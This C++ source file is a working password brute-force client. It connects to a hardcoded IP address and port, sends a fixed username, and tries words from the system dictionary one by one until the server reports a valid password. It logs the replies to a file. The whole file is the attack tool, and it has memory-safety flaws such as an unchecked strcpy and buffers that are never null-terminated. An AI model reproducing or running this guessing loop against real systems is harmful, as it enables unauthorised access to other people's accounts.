#include <string.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <iomanip>
#include <thread>
#include <cstring>
using namespace std;


string* passwords;
int size;
int count = 0;
int main(void)
{
  ifstream in("/usr/share/dict/words");
  string temp;
  size = 0;
  while(getline(in,temp))
    {
      if(temp.length() < 11 && islower(temp[0]))
	{
	  size++;
	}
    }
  
  in.close();
  
  passwords = new string[size];

  in.open("/usr/share/dict/words");
  int counter = 0;
  while(getline(in,temp))
    {
      if(temp.length() < 11 && islower(temp[0]))
	{
	  passwords[counter] = temp;
	  counter++;
	}
    }
  
  int cs = socket(PF_INET,SOCK_STREAM,0);
  if (cs <= 0)
  {
    cout << "client: Socket creation failed." << endl;
    exit(-1);
  }
  sockaddr_in address;
  int addressSize = sizeof(sockaddr);
  address.sin_family=AF_INET;
  address.sin_port = htons(7500);
  inet_pton(AF_INET,"52.25.223.40",&address.sin_addr);
  int rc = connect(cs,(struct sockaddr*) &address, addressSize);
  if(rc != 0)
  {
    cout << "client: connect failed, bad server address/bad port #" << endl;
    exit(-1);
  }
  
  cout << "client: server and client have established communication..." << endl;
  const int BUFFER_LENGTH = 1024;
  char buffer[BUFFER_LENGTH];
  string v = " vaild ";
  do
  {
    recv(cs,buffer,BUFFER_LENGTH,0);
    cout << "server sent ->  " << buffer << endl;
    char userID[BUFFER_LENGTH];
    userID[0] = 'u';
    userID[1] = 's';
    userID[2] = 'e';
    userID[3] = 'r';
    userID[4] = 'i';
    userID[5] = 'd';
    userID[6] = ':';
    for(int i = 7; i < 1024; i++)
      {
	userID[i] = '\0';
      }
    int checkUserid = strcmp(buffer,userID);
    if(checkUserid == 0)
      {
	cout << "I sent -> lgiannini"  << endl;
	string s = "lgiannini";
	char buffer1[BUFFER_LENGTH];
	buffer1[0] = 'l';
	buffer1[1] = 'g';
	buffer1[2] = 'i';
	buffer1[3] = 'a';
	buffer1[4] = 'n';
	buffer1[5] = 'n';
	buffer1[6] = 'i';
	buffer1[7] = 'n';
	buffer1[8] = 'i';
	for(int i = 9; i < 1024; i++)
	  {	
	    buffer1[i] = '\0';
	  }
	send(cs,buffer1,BUFFER_LENGTH,0);
	
      }
    recv(cs,buffer,BUFFER_LENGTH,0);
    cout << "server sent ->  " << buffer << endl;
    char pass[BUFFER_LENGTH];
    pass[0] = 'p';
    pass[1] = 'a';
    pass[2] = 's';
    pass[3] = 's';
    pass[4] = 'w';
    pass[5] = 'o';
    pass[6] = 'r';
    pass[7] = 'd';
    pass[8] = ':';
    for(int i = 9; i < 1024; i++) {
      pass[i] = '\0';
    }
    char temp[BUFFER_LENGTH];
    int checkServer = strcmp(buffer,pass);
    string toPrint = passwords[count];
    if(checkServer == 0) {
      cout << "I sent -> " << toPrint << endl;
      strcpy(buffer,passwords[count].c_str());
      send(cs,buffer,BUFFER_LENGTH,0);
    }
    recv(cs,buffer,BUFFER_LENGTH,0);
    cout << "server sent ->  " << buffer << endl;
    ofstream outfile;
    outfile.open("results5.txt",ios_base::app);
    outfile << buffer;
    char * p = strstr(buffer," valid ");
    if(p != NULL)
    {
      cout << "FOUND -> " << passwords[count] << endl;
      close(cs);
      break;
	  
    }
    count++;
   	
    
  } while(true);
  close(cs);

  

  return 1;



  




}//main
